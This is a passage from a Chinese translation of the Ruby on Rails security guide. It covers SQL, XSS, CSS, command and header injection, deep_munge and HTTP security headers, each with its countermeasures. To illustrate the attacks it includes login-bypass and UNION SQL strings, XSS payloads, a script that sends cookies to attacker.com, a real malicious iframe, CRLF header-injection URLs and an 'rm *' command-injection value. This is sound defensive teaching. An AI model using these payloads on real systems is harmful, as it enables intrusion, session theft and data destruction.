不要被混淆和JavaScript安全性所欺骗。开发者工具可以让您查看和更改每个表单的隐藏字段。JavaScript可以用于验证用户输入数据，但绝对不能阻止攻击者发送带有意外值的恶意请求。Mozilla Firefox的Firebug插件记录每个请求，并可以重复和更改它们。这是绕过任何JavaScript验证的简单方法。甚至还有客户端代理可以拦截从互联网发送和接收的任何请求和响应。

注入
---------

信息：注入是一类攻击，通过将恶意代码或参数引入Web应用程序中以在其安全上下文中运行来进行的。注入的突出例子是跨站脚本（XSS）和SQL注入。

注入非常棘手，因为同一段代码或参数在一个上下文中可能是恶意的，但在另一个上下文中完全无害。上下文可以是脚本语言、查询语言、编程语言、shell或Ruby/Rails方法。下面的章节将涵盖注入攻击可能发生的所有重要上下文。然而，第一节将涵盖与注入相关的架构决策。

### 允许列表与限制列表

注意：在对某些内容进行消毒、保护或验证时，优先使用允许列表而不是限制列表。

限制列表可以是一组不良电子邮件地址、非公开操作或不良HTML标签。相反，允许列表列出了良好的电子邮件地址、公开操作、良好的HTML标签等。虽然有时可能无法创建允许列表（例如在垃圾邮件过滤器中），但是优先使用允许列表方法：

- 对于与安全相关的操作，使用`before_action except: [...]`而不是`only: [...]`。这样您就不会忘记为新添加的操作启用安全检查。
- 允许使用`<strong>`而不是删除`<script>`来防止跨站脚本（XSS）。有关详细信息，请参见下文。
- 不要尝试使用限制列表来纠正用户输入：
  - 这将使攻击起作用：`"<sc<script>ript>".gsub("<script>", "")`
  - 但拒绝格式错误的输入

允许列表也是针对人为因素遗漏限制列表中某些内容的良好方法。

### SQL注入

信息：由于Rails应用程序中的巧妙方法，这在大多数情况下不是一个问题。然而，这是Web应用程序中非常严重和常见的攻击，因此了解这个问题非常重要。

#### 介绍

SQL注入攻击旨在通过操纵Web应用程序参数来影响数据库查询。SQL注入攻击的一个常见目标是绕过授权。另一个目标是执行数据操作或读取任意数据。以下是一个示例，展示了如何不在查询中使用用户输入数据：

```ruby
Project.where("name = '#{params[:name]}'")
```

这可能是在搜索操作中，用户可能输入他们想要查找的项目名称。如果恶意用户输入`' OR 1) --`，生成的SQL查询将是：

```sql
SELECT * FROM projects WHERE (name = '' OR 1) --')
```

两个破折号开始一个注释，忽略之后的所有内容。因此，查询将返回项目表中的所有记录，包括对用户不可见的记录。这是因为对于所有记录来说，条件都是成立的。

#### 绕过授权

通常，Web应用程序包括访问控制。用户输入他们的登录凭据，Web应用程序尝试在用户表中找到匹配的记录。当找到记录时，应用程序授予访问权限。然而，攻击者可能通过SQL注入绕过此检查。以下是在Rails中查找与用户提供的登录凭据参数匹配的用户表中的第一条记录的典型数据库查询示例。
```ruby
User.find_by("login = '#{params[:name]}' AND password = '#{params[:password]}'")
```

如果攻击者将`' OR '1'='1`作为用户名，将`' OR '2'>'1`作为密码输入，生成的SQL查询将如下所示：

```sql
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
```

这将简单地在数据库中找到第一条记录，并授予该用户访问权限。

#### 未经授权的读取

UNION语句连接两个SQL查询并将数据返回为一个集合。攻击者可以使用它来从数据库中读取任意数据。让我们以上面的例子为例：

```ruby
Project.where("name = '#{params[:name]}'")
```

现在让我们使用UNION语句注入另一个查询：

```
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
```

这将导致以下SQL查询：

```sql
SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
```

结果不会是项目列表（因为没有空名称的项目），而是用户名和密码的列表。所以希望您在数据库中[安全地哈希密码](#user-management)！对于攻击者来说，唯一的问题是两个查询中的列数必须相同。这就是为什么第二个查询包含了一系列的1，它们将始终是值1，以匹配第一个查询中的列数。

此外，第二个查询使用AS语句对一些列进行重命名，以便Web应用程序显示来自用户表的值。请确保将您的Rails更新到至少2.1.1。

#### 对策

Ruby on Rails内置了一个用于特殊SQL字符的过滤器，它将转义`'`、`"`、NULL字符和换行符。*使用`Model.find(id)`或`Model.find_by_something(something)`会自动应用此对策*。但是在SQL片段中，特别是*在条件片段（`where("...")`）中，`connection.execute()`或`Model.find_by_sql()`方法中，必须手动应用*。

您可以使用位置处理程序来消毒受污染的字符串，如下所示：

```ruby
Model.where("zip_code = ? AND quantity >= ?", entered_zip_code, entered_quantity).first
```

第一个参数是带有问号的SQL片段。第二个和第三个参数将使用变量的值替换问号。

您还可以使用命名处理程序，值将从使用的哈希中获取：

```ruby
values = { zip: entered_zip_code, qty: entered_quantity }
Model.where("zip_code = :zip AND quantity >= :qty", values).first
```

此外，您可以拆分和链接适用于您的用例的条件：

```ruby
Model.where(zip_code: entered_zip_code).where("quantity >= ?", entered_quantity).first
```

请注意，前面提到的对策仅适用于模型实例。您可以在其他地方尝试[`sanitize_sql`][]。_养成在SQL中使用外部字符串时考虑安全后果的习惯_。


### 跨站脚本攻击（XSS）

INFO：_跨站脚本攻击（XSS）是Web应用程序中最常见、最具破坏力的安全漏洞之一。这种恶意攻击注入客户端可执行代码。Rails提供了帮助方法来防御这些攻击。_

#### 入口点

入口点是一个易受攻击的URL及其参数，攻击者可以在此处发起攻击。

最常见的入口点是消息发布、用户评论和留言簿，但项目标题、文档名称和搜索结果页面也可能存在漏洞 - 几乎任何用户可以输入数据的地方。但输入的数据不一定要来自网站上的输入框，它可以在任何URL参数中 - 明显的、隐藏的或内部的。请记住，用户可能会拦截任何流量。应用程序或客户端代理使更改请求变得容易。还有其他攻击向量，如横幅广告。

XSS攻击的工作原理如下：攻击者注入一些代码，Web应用程序保存并在页面上显示它，然后呈现给受害者。大多数XSS示例只是显示一个警报框，但它比这更强大。XSS可以窃取cookie，劫持会话，将受害者重定向到假网站，显示有利于攻击者的广告，更改网站上的元素以获取机密信息，或通过Web浏览器中的安全漏洞安装恶意软件。

在2007年下半年，Mozilla浏览器报告了88个漏洞，Safari报告了22个漏洞，IE报告了18个漏洞，Opera报告了12个漏洞。Symantec全球互联网安全威胁报告还记录了2007年下半年的239个浏览器插件漏洞。[Mpack](https://www.pandasecurity.com/en/mediacenter/malware/mpack-uncovered/)是一个非常活跃和最新的攻击框架，利用了这些漏洞。对于犯罪黑客来说，利用Web应用程序框架中的SQL注入漏洞并在每个文本表列中插入恶意代码非常有吸引力。在2008年4月，超过51万个网站被黑客攻击，其中包括英国政府、联合国和许多其他知名目标。
#### HTML/JavaScript注入

最常见的XSS语言当然是最流行的客户端脚本语言JavaScript，通常与HTML结合使用。_转义用户输入是必不可少的_。

下面是最简单的测试，用于检查XSS：

```html
<script>alert('Hello');</script>
```

这段JavaScript代码将简单地显示一个警告框。下面的示例完全相同，只是位置非常不常见：

```html
<img src="javascript:alert('Hello')">
<table background="javascript:alert('Hello')">
```

##### Cookie窃取

到目前为止，这些示例都没有造成任何伤害，那么让我们看看攻击者如何窃取用户的cookie（从而劫持用户的会话）。在JavaScript中，您可以使用`document.cookie`属性来读取和写入文档的cookie。JavaScript强制执行同源策略，这意味着来自一个域的脚本无法访问另一个域的cookie。`document.cookie`属性保存了源Web服务器的cookie。但是，如果您直接将代码嵌入到HTML文档中（就像XSS一样），则可以读取和写入此属性。在您的Web应用程序中的任何位置注入以下代码，以在结果页面上查看自己的cookie：

```html
<script>document.write(document.cookie);</script>
```

对于攻击者来说，当然这没有用，因为受害者将看到自己的cookie。下一个示例将尝试从URL http://www.attacker.com/ 加上cookie加载图像。当然，此URL不存在，所以浏览器不显示任何内容。但是攻击者可以查看他们的Web服务器访问日志文件以查看受害者的cookie。

```html
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
```

www.attacker.com 上的日志文件将显示如下内容：

```
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
```

您可以通过向cookie添加**httpOnly**标志来减轻这些攻击（以明显的方式），以便JavaScript无法读取`document.cookie`。从IE v6.SP1、Firefox v2.0.0.5、Opera 9.5、Safari 4和Chrome 1.0.154开始，可以使用HTTP only cookie。但是其他旧版本的浏览器（如WebTV和Mac上的IE 5.5）实际上可能导致页面无法加载。请注意，使用Ajax仍然可以看到cookie，尽管如此。

##### 网页篡改

通过网页篡改，攻击者可以做很多事情，例如呈现虚假信息或引诱受害者访问攻击者的网站以窃取cookie、登录凭据或其他敏感数据。最常见的方法是通过iframe包含来自外部源的代码：

```html
<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
```

这将从外部源加载任意HTML和/或JavaScript，并将其嵌入到网站中。此`iframe`来自对合法意大利网站使用[Mpack攻击框架](https://isc.sans.edu/diary/MPack+Analysis/3015)的实际攻击。Mpack尝试通过Web浏览器中的安全漏洞安装恶意软件-非常成功，50%的攻击成功。

更专门的攻击可能会覆盖整个网站或显示一个登录表单，该表单看起来与网站的原始表单相同，但会将用户名和密码传输到攻击者的网站。或者，它可以使用CSS和/或JavaScript隐藏Web应用程序中的合法链接，并在其位置显示另一个链接，该链接重定向到一个假网站。

反射注入攻击是指负载不会存储以供以后呈现给受害者，而是包含在URL中的攻击。特别是搜索表单未对搜索字符串进行转义。以下链接呈现了一个页面，其中指出“乔治·布什任命了一个9岁的男孩担任主席...”：

```
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
```

##### 对策

_过滤恶意输入非常重要，但转义Web应用程序的输出也很重要_。

特别是对于XSS，重要的是进行_允许的输入过滤而不是限制的过滤_。允许列表过滤声明允许的值，而不是不允许的值。受限制的列表永远不会完整。

想象一下，受限制的列表从用户输入中删除了`"script"`。现在攻击者注入了`"<scrscriptipt>"`，并且在过滤之后，`"<script>"`仍然存在。Rails的早期版本对于`strip_tags()`、`strip_links()`和`sanitize()`方法使用了受限制的列表方法。因此，这种注入是可能的：

```ruby
strip_tags("some<<b>script>alert('hello')<</b>/script>")
```

这将返回`"some<script>alert('hello')</script>"`，从而使攻击成功。这就是为什么允许列表方法更好，使用更新的Rails 2方法`sanitize()`：
```ruby
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
```

这样只允许给定的标签，并且对各种技巧和格式错误的标签都有很好的处理效果。

作为第二步，_在重新显示用户输入时，最好对应用程序的所有输出进行转义处理_，特别是未经输入过滤的用户输入。可以使用`html_escape()`（或其别名`h()`）方法，将HTML输入字符`&`、`"`、`<`和`>`替换为它们在HTML中的未解释表示（`&amp;`、`&quot;`、`&lt;`和`&gt;`）。

##### 混淆和编码注入

网络流量主要基于有限的西方字母表，因此出现了新的字符编码，如Unicode，用于传输其他语言中的字符。但是，这也对Web应用程序构成威胁，因为恶意代码可以隐藏在Web浏览器可能能够处理但Web应用程序可能无法处理的不同编码中。下面是一个使用UTF-8编码的攻击向量示例：

```html
<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
```

这个示例会弹出一个消息框。然而，它会被上面的`sanitize()`过滤器识别出来。一个很好的混淆和编码字符串的工具，从而“了解你的敌人”，是[Hackvertor](https://hackvertor.co.uk/public)。Rails的`sanitize()`方法在防御编码攻击方面做得很好。

#### 地下攻击的示例

_为了了解当今对Web应用程序的攻击，最好看一些真实的攻击向量。_

以下是[Yahoo! Mail蠕虫Js.Yamanner@m](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=12d8d106-1137-4d7c-8bb4-3ea1faec83fa)的摘录。它于2006年6月11日出现，是第一个针对Web邮件界面的蠕虫：

```html
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
```

这些蠕虫利用了Yahoo的HTML/JavaScript过滤器中的漏洞，该过滤器通常会过滤掉标签中的所有目标和onload属性（因为可能存在JavaScript）。然而，过滤器只应用一次，因此带有蠕虫代码的onload属性仍然存在。这是一个很好的例子，说明受限制的列表过滤器永远不会完整，并且为什么在Web应用程序中允许HTML/JavaScript是困难的。

另一个概念验证的Web邮件蠕虫是Nduja，它是为四个意大利Web邮件服务而设计的跨域蠕虫。在[Rosario Valotta的论文](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/)中可以找到更多详细信息。这两个Web邮件蠕虫的目标是收集电子邮件地址，这是一个犯罪黑客可以赚钱的东西。

2006年12月，在[MySpace钓鱼攻击](https://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html)中，34000个实际用户名和密码被盗。攻击的思路是创建一个名为“login_home_index_html”的个人资料页面，使URL看起来非常可信。使用特制的HTML和CSS来隐藏页面上真正的MySpace内容，并显示自己的登录表单。

### CSS注入

INFO：_CSS注入实际上是JavaScript注入，因为某些浏览器（IE、某些版本的Safari等）允许在CSS中使用JavaScript。在您的Web应用程序中，仔细考虑是否允许自定义CSS。_

CSS注入最好通过著名的[MySpace Samy蠕虫](https://samy.pl/myspace/tech.html)来解释。这个蠕虫只需访问Samy（攻击者）的个人资料，就会自动向他发送好友请求。几个小时内，他收到了超过100万个好友请求，这导致MySpace宕机。以下是该蠕虫的技术解释。

MySpace阻止了许多标签，但允许使用CSS。因此，蠕虫的作者将JavaScript放入CSS中，如下所示：

```html
<div style="background:url('javascript:alert(1)')">
```

因此，有效载荷位于style属性中。但是，有效载荷中不允许使用引号，因为单引号和双引号已经被使用了。但是JavaScript有一个方便的`eval()`函数，可以将任何字符串作为代码执行。

```html
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
```

`eval()`函数对于受限制的列表输入过滤器来说是一个噩梦，因为它允许style属性隐藏单词"innerHTML"：

```js
alert(eval('document.body.inne' + 'rHTML'));
```

下一个问题是MySpace过滤掉了单词"javascript"，因此作者使用了"java<NEWLINE>script"来绕过这个问题：

```html
<div id="mycode" expr="alert('hah!')" style="background:url('java↵script:eval(document.all.mycode.expr)')">
```

蠕虫作者面临的另一个问题是[CSRF安全令牌](#跨站请求伪造csrf)。没有这些令牌，他无法通过POST发送好友请求。他通过在添加用户之前向页面发送GET请求，并解析结果以获取CSRF令牌来解决这个问题。
最后，他得到了一个4 KB的蠕虫，将其注入到他的个人资料页面中。

[moz-binding](https://securiteam.com/securitynews/5LP051FHPE) CSS属性被证明是在基于Gecko的浏览器（例如Firefox）中引入JavaScript到CSS的另一种方法。

#### 对策

这个例子再次表明，受限制的列表过滤器永远不会完整。然而，由于在Web应用程序中使用自定义CSS是一个相当罕见的功能，因此可能很难找到一个好的允许的CSS过滤器。_如果您想允许自定义颜色或图像，可以允许用户选择它们并在Web应用程序中构建CSS_。如果确实需要一个允许的CSS过滤器，可以使用Rails的`sanitize()`方法作为模型。

### Textile注入

如果您想提供除HTML之外的文本格式（出于安全考虑），请使用一种在服务器端转换为HTML的标记语言。[RedCloth](http://redcloth.org/)是Ruby的一种这样的语言，但如果没有预防措施，它也容易受到XSS攻击。

例如，RedCloth将`_test_`转换为`<em>test<em>`，使文本变为斜体。然而，直到当前版本3.0.4，它仍然容易受到XSS攻击。获取[全新的版本4](http://www.redcloth.org)，它修复了严重的错误。然而，即使是那个版本也有[一些安全漏洞](https://rorsecurity.info/journal/2008/10/13/new-redcloth-security.html)，因此仍然适用相同的对策。以下是版本3.0.4的示例：

```ruby
RedCloth.new('<script>alert(1)</script>').to_html
# => "<script>alert(1)</script>"
```

使用`:filter_html`选项来删除不是由Textile处理器创建的HTML。

```ruby
RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
# => "alert(1)"
```

然而，这并不能过滤所有的HTML，一些标签会被保留（出于设计考虑），例如`<a>`：

```ruby
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href="javascript:alert(1)">hello</a></p>"
```

#### 对策

建议_将RedCloth与允许的输入过滤器结合使用_，如防止XSS部分所述。

### Ajax注入

注意：_对于Ajax操作，必须采取与“正常”操作相同的安全预防措施。然而，至少有一个例外：如果操作不渲染视图，则在控制器中必须对输出进行转义。_

如果您使用[in_place_editor插件](https://rubygems.org/gems/in_place_editing)，或者返回字符串而不是渲染视图的操作，_您必须在操作中转义返回值_。否则，如果返回值包含XSS字符串，恶意代码将在返回到浏览器时执行。使用`h()`方法转义任何输入值。

### 命令行注入

注意：_谨慎使用用户提供的命令行参数。_

如果您的应用程序需要在底层操作系统中执行命令，Ruby中有几种方法：`system(command)`、`exec(command)`、`spawn(command)`和`` `command` ``。如果用户可以输入整个命令或其中一部分，您必须特别小心这些函数。这是因为在大多数shell中，您可以在第一个命令的末尾执行另一个命令，使用分号（`;`）或竖线（`|`）将它们连接起来。

```ruby
user_input = "hello; rm *"
system("/bin/echo #{user_input}")
# 打印"hello"，并删除当前目录中的文件
```

一种对策是_使用`system(command, parameters)`方法安全地传递命令行参数_。

```ruby
system("/bin/echo", "hello; rm *")
# 打印"hello; rm *"，不会删除文件
```

#### Kernel#open的漏洞

如果参数以竖线（`|`）开头，`Kernel#open`会执行操作系统命令。

```ruby
open('| ls') { |file| file.read }
# 通过`ls`命令返回文件列表作为字符串
```

对策是改用`File.open`、`IO.open`或`URI#open`。它们不会执行操作系统命令。

```ruby
File.open('| ls') { |file| file.read }
# 不会执行`ls`命令，只是打开`| ls`文件（如果存在）

IO.open(0) { |file| file.read }
# 打开标准输入。不接受字符串作为参数

require 'open-uri'
URI('https://example.com').open { |file| file.read }
# 打开URI。`URI()`不接受`| ls`
```

### 头部注入

警告：_HTTP头部是动态生成的，在某些情况下，用户输入可能会被注入。这可能导致错误的重定向、XSS或HTTP响应拆分。_

HTTP请求头部有Referer、User-Agent（客户端软件）和Cookie字段，等等。例如，响应头部有状态码、Cookie和Location（重定向目标URL）字段。所有这些字段都是由用户提供的，可能会被更多或更少地操纵。_请记住对这些头部字段进行转义。_例如，在管理区域显示用户代理时。
此外，在根据用户输入构建响应头时，了解自己在做什么是非常重要的。例如，您想要将用户重定向回特定页面。为此，您在表单中引入了一个“referer”字段，以重定向到给定的地址：

```ruby
redirect_to params[:referer]
```

Rails会将字符串放入“Location”头字段，并向浏览器发送302（重定向）状态。恶意用户会做的第一件事是这样：

```
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
```

由于（Ruby和）Rails版本2.1.2（不包括该版本）中存在的一个错误，黑客可以注入任意的头字段；例如，像这样：

```
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
```

请注意，`%0d%0a`是URL编码的`\r\n`，在Ruby中表示回车和换行（CRLF）。因此，第二个示例的结果HTTP头将如下所示，因为第二个Location头字段覆盖了第一个。

```http
HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
```

因此，头注入的攻击向量是基于在头字段中注入CRLF字符。攻击者可能会对错误的重定向做什么？他们可以重定向到一个看起来与您的网站相同的钓鱼网站，并要求重新登录（并将登录凭据发送给攻击者）。或者他们可以通过浏览器安全漏洞在该网站上安装恶意软件。Rails 2.1.2在`redirect_to`方法中对Location字段中的这些字符进行了转义。在构建其他带有用户输入的头字段时，请确保自己也进行转义。

#### DNS重新绑定和主机头攻击

DNS重新绑定是一种常用的计算机攻击形式，它是一种操纵域名解析的方法。DNS重新绑定通过滥用域名系统（DNS）来绕过同源策略。它将域名重新绑定到不同的IP地址，然后通过从更改后的IP地址对您的Rails应用程序执行随机代码来破坏系统。

建议使用`ActionDispatch::HostAuthorization`中间件来防止DNS重新绑定和其他主机头攻击。它在开发环境中默认启用，您需要在生产和其他环境中通过设置允许的主机列表来激活它。您还可以配置异常并设置自己的响应应用程序。

```ruby
Rails.application.config.hosts << "product.com"

Rails.application.config.host_authorization = {
  # 从主机检查中排除对/healthcheck/路径的请求
  exclude: ->(request) { request.path =~ /healthcheck/ }
  # 添加自定义的Rack应用程序作为响应
  response_app: -> env do
    [400, { "Content-Type" => "text/plain" }, ["Bad Request"]]
  end
}
```

您可以在[`ActionDispatch::HostAuthorization`中间件文档](/configuring.html#actiondispatch-hostauthorization)中了解更多信息。

#### 响应拆分

如果头注入是可能的，那么响应拆分也可能是可能的。在HTTP中，头块后面是两个CRLF和实际数据（通常是HTML）。响应拆分的思想是在头字段中注入两个CRLF，然后是另一个带有恶意HTML的响应。响应将如下所示：

```http
HTTP/1.1 302 Found [第一个标准的302响应]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location:Content-Type: text/html


HTTP/1.1 200 OK [攻击者创建的第二个新响应开始]
Content-Type: text/html


&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [显示为重定向页面的任意恶意输入]
Keep-Alive: timeout=15, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
```

在某些情况下，这将向受害者呈现恶意HTML。但是，这似乎只适用于持久连接（许多浏览器使用一次性连接）。但您不能依赖于此。无论如何，这都是一个严重的错误，您应该将Rails更新到版本2.0.5或2.1.2以消除头注入（从而消除响应拆分）的风险。

不安全的查询生成
-----------------------

由于Active Record解释参数的方式与Rack解析查询参数的方式相结合，可能会出现使用`IS NULL`的意外数据库查询。作为对该安全问题的响应（[CVE-2012-2660](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ)、[CVE-2012-2694](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ)和[CVE-2013-0155](https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ)），引入了`deep_munge`方法作为默认情况下保持Rails安全的解决方案。

如果没有执行`deep_munge`，攻击者可以使用以下易受攻击的代码：

```ruby
unless params[:token].nil?
  user = User.find_by_token(params[:token])
  user.reset_password!
end
```

当`params[:token]`是`[nil]`、`[nil, nil, ...]`或`['foo', nil]`之一时，它将绕过对`nil`的测试，但仍将添加`IS NULL`或`IN ('foo', NULL)`的where子句到SQL查询中。
为了默认情况下保持Rails的安全性，`deep_munge`会将一些值替换为`nil`。下表显示了基于请求中发送的`JSON`的参数的样子：

| JSON                              | 参数                      |
|-----------------------------------|--------------------------|
| `{ "person": null }`              | `{ :person => nil }`     |
| `{ "person": [] }`                | `{ :person => [] }`     |
| `{ "person": [null] }`            | `{ :person => [] }`     |
| `{ "person": [null, null, ...] }` | `{ :person => [] }`     |
| `{ "person": ["foo", null] }`     | `{ :person => ["foo"] }` |

如果您了解风险并知道如何处理它，可以通过配置应用程序来返回到旧的行为并禁用`deep_munge`：

```ruby
config.action_dispatch.perform_deep_munge = false
```

HTTP安全头
---------------------

为了提高应用程序的安全性，可以配置Rails返回HTTP安全头。一些头部是默认配置的，其他头部需要显式配置。

### 默认安全头

默认情况下，Rails配置为返回以下响应头。您的应用程序会为每个HTTP响应返回这些头部。

#### `X-Frame-Options`

[`X-Frame-Options`][]头部指示浏览器是否可以在`<frame>`、`<iframe>`、`<embed>`或`<object>`标签中呈现页面。默认情况下，此头部设置为`SAMEORIGIN`，仅允许在同一域中进行框架化。将其设置为`DENY`以完全禁止框架化，或者完全删除此头部以允许在所有域中进行框架化。

#### `X-XSS-Protection`

Rails默认情况下将[弃用的旧版](https://owasp.org/www-project-secure-headers/#x-xss-protection)头部设置为`0`，以禁用有问题的旧版XSS审计器。

#### `X-Content-Type-Options`

Rails默认情况下将[`X-Content-Type-Options`][]头部设置为`nosniff`。它阻止浏览器猜测文件的MIME类型。

#### `X-Permitted-Cross-Domain-Policies`

Rails默认情况下将此头部设置为`none`。它禁止Adobe Flash和PDF客户端将您的页面嵌入到其他域中。

#### `Referrer-Policy`

Rails默认情况下将[`Referrer-Policy`][]头部设置为`strict-origin-when-cross-origin`。对于跨域请求，它仅在Referer头部中发送源。这可以防止私有数据泄露，这些数据可能可以从完整URL的其他部分（如路径和查询字符串）访问。

#### 配置默认头部

这些头部的默认配置如下：

```ruby
config.action_dispatch.default_headers = {
  'X-Frame-Options' => 'SAMEORIGIN',
  'X-XSS-Protection' => '0',
  'X-Content-Type-Options' => 'nosniff',
  'X-Permitted-Cross-Domain-Policies' => 'none',
  'Referrer-Policy' => 'strict-origin-when-cross-origin'
}
```

您可以在`config/application.rb`中覆盖这些头部或添加额外的头部：

```ruby
config.action_dispatch.default_headers['X-Frame-Options'] = 'DENY'
config.action_dispatch.default_headers['Header-Name']     = 'Value'
```

或者您可以将它们删除：

```ruby
config.action_dispatch.default_headers.clear
```

### `Strict-Transport-Security`头部

HTTP [`Strict-Transport-Security`][]（HTST）响应头部确保浏览器自动升级到HTTPS以进行当前和未来的连接。

启用`force_ssl`选项时，将该头部添加到响应中：

```ruby
  config.force_ssl = true
```

### `Content-Security-Policy`头部

为了防止XSS和注入攻击，建议为您的应用程序定义一个[`Content-Security-Policy`][]响应头部。Rails提供了一个DSL，允许您配置头部。

在适当的初始化器中定义安全策略：

```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.default_src :self, :https
  policy.font_src    :self, :https, :data
  policy.img_src     :self, :https, :data
  policy.object_src  :none
  policy.script_src  :self, :https
  policy.style_src   :self, :https
  # 指定违规报告的URI
  policy.report_uri "/csp-violation-report-endpoint"
end
```

全局配置的策略可以在每个资源上进行覆盖：

```ruby
class PostsController < ApplicationController
  content_security_policy do |policy|
    policy.upgrade_insecure_requests true
    policy.base_uri "https://www.example.com"
  end
end
```

或者可以禁用它：

```ruby
class LegacyPagesController < ApplicationController
  content_security_policy false, only: :index
end
```

使用lambda表达式注入每个请求的值，例如在多租户应用程序中的帐户子域：

```ruby
class PostsController < ApplicationController
  content_security_policy do |policy|
    policy.base_uri :self, -> { "https://#{current_user.domain}.example.com" }
  end
end
```

#### 报告违规行为

启用[`report-uri`][]指令将违规行为报告给指定的URI：

```ruby
Rails.application.config.content_security_policy do |policy|
  policy.report_uri "/csp-violation-report-endpoint"
end
```

在迁移遗留内容时，您可能希望报告违规行为而不强制执行策略。将[`Content-Security-Policy-Report-Only`][]响应头部设置为仅报告违规行为：

```ruby
Rails.application.config.content_security_policy_report_only = true
```

或在控制器中覆盖它：

```ruby
class PostsController < ApplicationController
  content_security_policy_report_only only: :index
end
```

#### 添加Nonce

如果您正在考虑使用`'unsafe-inline'`，请考虑改用nonce。[Nonce在现有代码的基础上实施内容安全策略时，提供了显著的改进](https://www.w3.org/TR/CSP3/#security-nonces)。
```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.script_src :self, :https
end

Rails.application.config.content_security_policy_nonce_generator = -> request { SecureRandom.base64(16) }
```

在配置nonce生成器时需要考虑一些权衡。使用`SecureRandom.base64(16)`是一个很好的默认值，因为它会为每个请求生成一个新的随机nonce。然而，这种方法与[条件GET缓存](caching_with_rails.html#conditional-get-support)不兼容，因为新的nonce会导致每个请求的ETag值都不同。一个替代每个请求随机nonce的方法是使用会话ID：

```ruby
Rails.application.config.content_security_policy_nonce_generator = -> request { request.session.id.to_s }
```

这种生成方法与ETag兼容，但其安全性取决于会话ID足够随机且不会在不安全的cookie中暴露。

默认情况下，如果定义了nonce生成器，nonce将应用于`script-src`和`style-src`。可以使用`config.content_security_policy_nonce_directives`来更改哪些指令将使用nonce：

```ruby
Rails.application.config.content_security_policy_nonce_directives = %w(script-src)
```

一旦在初始化程序中配置了nonce生成，可以通过在`html_options`中传递`nonce: true`来向脚本标签添加自动nonce值：

```html+erb
<%= javascript_tag nonce: true do -%>
  alert('Hello, World!');
<% end -%>
```

对于`javascript_include_tag`也是同样的：

```html+erb
<%= javascript_include_tag "script", nonce: true %>
```

使用[`csp_meta_tag`](https://api.rubyonrails.org/classes/ActionView/Helpers/CspHelper.html#method-i-csp_meta_tag)助手创建一个名为"csp-nonce"的元标签，其中包含每个会话的nonce值，以允许内联`<script>`标签。

```html+erb
<head>
  <%= csp_meta_tag %>
</head>
```

这被Rails UJS助手用于创建动态加载的内联`<script>`元素。

### `Feature-Policy`头

注意：`Feature-Policy`头已更名为`Permissions-Policy`。`Permissions-Policy`需要不同的实现方式，并且尚未被所有浏览器支持。为了避免将来需要重命名此中间件，我们使用新名称来命名中间件，但目前仍保留旧的头名称和实现。

要允许或阻止浏览器功能的使用，可以为应用程序定义一个[`Feature-Policy`][]响应头。Rails提供了一个DSL，允许您配置头。

在适当的初始化程序中定义策略：

```ruby
# config/initializers/permissions_policy.rb
Rails.application.config.permissions_policy do |policy|
  policy.camera      :none
  policy.gyroscope   :none
  policy.microphone  :none
  policy.usb         :none
  policy.fullscreen  :self
  policy.payment     :self, "https://secure.example.com"
end
```

全局配置的策略可以在每个资源上进行覆盖：

```ruby
class PagesController < ApplicationController
  permissions_policy do |policy|
    policy.geolocation "https://example.com"
  end
end
```


### 跨域资源共享

浏览器限制了从脚本发起的跨域HTTP请求。如果您想将Rails作为API运行，并在单独的域上运行前端应用程序，则需要启用[跨域资源共享](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)（CORS）。

您可以使用[Rack CORS](https://github.com/cyu/rack-cors)中间件来处理CORS。如果您使用`--api`选项生成了应用程序，则Rack CORS可能已经配置好了，您可以跳过以下步骤。

首先，将rack-cors gem添加到Gemfile中：

```ruby
gem 'rack-cors'
```

接下来，添加一个初始化程序来配置中间件：

```ruby
# config/initializers/cors.rb
Rails.application.config.middleware.insert_before 0, "Rack::Cors" do
  allow do
    origins 'example.com'

    resource '*',
      headers: :any,
      methods: [:get, :post, :put, :patch, :delete, :options, :head]
  end
end
```

